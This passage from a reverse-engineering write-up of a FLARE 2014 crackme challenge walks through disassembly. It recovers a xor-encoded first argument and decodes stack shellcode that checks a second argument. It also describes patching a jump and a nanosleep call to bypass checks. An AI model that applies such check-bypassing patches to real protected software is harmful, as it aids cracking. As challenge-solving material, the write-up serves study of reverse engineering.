&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437161&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;arg1_2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437168&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043716&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;56h&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; xor with 0x56&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043716&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dl&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437170&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;counter_?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;; jumps back to top&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We see another &lt;code&gt;repne scasb&lt;/code&gt;. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with &lt;code&gt;0x56&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;loc_437177&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt; 
  &lt;span style=&#34;color: #93A1A1&#34;&gt;arg1[i]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;arg1[i]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x56&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;If the loop is done, the &lt;code&gt;jnz&lt;/code&gt; in line 19 will not be triggered and we land somewhere else.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Comparison&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;arg1_2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; arg1 xor 0x56&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ah&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aBngcgDebd&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;bngcg`debd&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_400370&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; func(arg1 xor 0x56, hexlify(bngcg`debd) )&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; if function is successful, will return 0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4371F2&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; jumps if return value = 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Application loads the string &lt;code&gt;bngcg`debd&lt;/code&gt; and compares the result of &lt;code&gt;arg1 xor 0x56&lt;/code&gt; with it. If both are equal, &lt;code&gt;jz&lt;/code&gt; in line 7 will be taken.&lt;br /&gt;
We have already seen the transitive property of xor so we can calculate the correct value of first argument which is &lt;code&gt;4815162342&lt;/code&gt;. We could also patch the &lt;code&gt;jz&lt;/code&gt; to &lt;code&gt;jmp&lt;/code&gt; and enter any 10 characters for argument one.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;First argument&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;arg1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x56&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;bngcg`debd&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;arg1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;bngcg`debd&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x56&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;arg1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;4815162342&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction &lt;code&gt;mov  cs:byte_729AC2, al&lt;/code&gt;. At that address, there are bytes being written and they are in &lt;code&gt;base64&lt;/code&gt;. I was stepping through until suddenly everything stopped and I saw that a &lt;code&gt;nanosleep&lt;/code&gt; syscall was executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/6-2.jpg&#34; alt=&#34;nanosleep&#34; title=&#34;nanosleep&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and &lt;a href=&#34;https://twitter.com/FireEye/status/496757071644487680&#34; target=&#34;_blank&#34;&gt;sub_401164&lt;/a&gt; was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Checking argument 2&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC39C&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; ---------------------------------------------------------------------------&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC39C&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;loc_7FFF3A5AC39C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC39C&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;ror&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0F2h&lt;/span&gt;            &lt;span style=&#34;color: #586E75&#34;&gt;; arg2[0] ror 0xF2 == 0x1B&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC39F&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1Bh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A2&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_7FFF3A5AC3A6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A4&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rbx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A6&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A6&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;loc_7FFF3A5AC3A6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3A6&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3AA&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40h&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; arg2[1] xor 0x40 xor 0xF2 xor 0xB3 == 0x30&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3AD&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0F2h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3B0&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0B3h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3B3&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3B6&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_7FFF3A5AC3BA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;stack&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FFF3A5AC3B8&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rbx&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example &lt;code&gt;arg2[0] ror 0xF2 must equal 0x1B&lt;/code&gt;, otherwise &lt;code&gt;jz&lt;/code&gt; will be called and application will terminate in &lt;code&gt;loc_7FFF3A5AC3A6&lt;/code&gt;. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.&lt;/p&gt;

&lt;p&gt;Python does not have &lt;code&gt;ror&lt;/code&gt; and &lt;code&gt;rol&lt;/code&gt; binary operators so I stole them from &lt;a href=&#34;http://www.falatic.com/index.php/108/python-and-bitwise-rotation&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Second argument&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# rol and ror implementations taken from &lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# http://www.falatic.com/index.php/108/python-and-bitwise-rotation&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# Rotate left: 0b1001 --&amp;gt; 0b0011&lt;/span&gt;
